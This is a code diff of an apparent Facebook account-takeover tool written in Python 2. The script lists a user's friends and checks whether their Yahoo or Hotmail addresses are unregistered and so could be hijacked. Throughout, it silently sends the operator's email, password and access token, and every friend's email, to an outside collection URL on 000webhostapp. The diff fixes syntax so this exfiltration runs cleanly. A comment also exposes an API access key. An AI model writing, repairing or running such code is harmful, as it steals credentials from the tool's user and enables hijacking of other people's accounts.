@@ -27,7 +27,7 @@ else:
 try:
     pd = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + (token))
 except:
-
+    pass
 get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + (token))
 hasil = json.loads(get_friends.text)
 print ("\033[39m[\033[31m+\033[39m] Frind list OK !!")
@@ -51,30 +51,28 @@ def defense():
             kunci = re.compile(r'@.*')
             cari = kunci.search(z['email']).group()
             if 'yahoo.com' in cari:
-                try:
                     br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                     br._factory.is_html = True
                     br.select_form(nr=0)
                     br["username"] = z['email']
                     j = br.submit().read()
                     Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-                except:
-                
                 try:
                     cd = Zen.search(j).group()
                 except:
+                    vuln = 6*" " + "\033[31mNot Available"
+                    #Email Len
+                    lean = 30 - (len(z['email']))
+                    eml = lean * " "
+                    #Name Len
+                    lone = 24 - (len(vuln))
+                    namel = lone * " "
                     try:
-                         vuln = 6*" " + "\033[31mNot Available"
-                        #Email Len
-                        lean = 30 - (len(z['email']))
-                        eml = lean * " "
-                        #Name Len
-                        lone = 24 - (len(vuln))
-                        namel = lone * " "
                         pd2 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Just Yahoo Not Available&tk=no")
-                        print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
-                        continue
                     except:
+                        pass
+                    print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
+                    continue
                 if '"messages.ERROR_INVALID_USERNAME">' in cd:
                     vuln = 8*" " + "\033[32mOK"
                 else:
@@ -89,7 +87,7 @@ def defense():
                 try:
                     pd3 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Available Yahoo&tk=no")
                 except:
-        
+                    pass
                 print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
             elif 'hotmail' in cari: #
                 #url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
@@ -108,6 +106,7 @@ def defense():
                 try:
                     pd4 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no")
                 except:
+                    pass
                 print "\033[36m| " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
             else:
                 vuln = 8*" " + "\033[36mNot sure !"
@@ -123,6 +122,7 @@ def defense():
                 try:
                     pd5 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no")
                 except:
+                    pass
                 print "\033[36m| " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
                 #pass
         except KeyError:
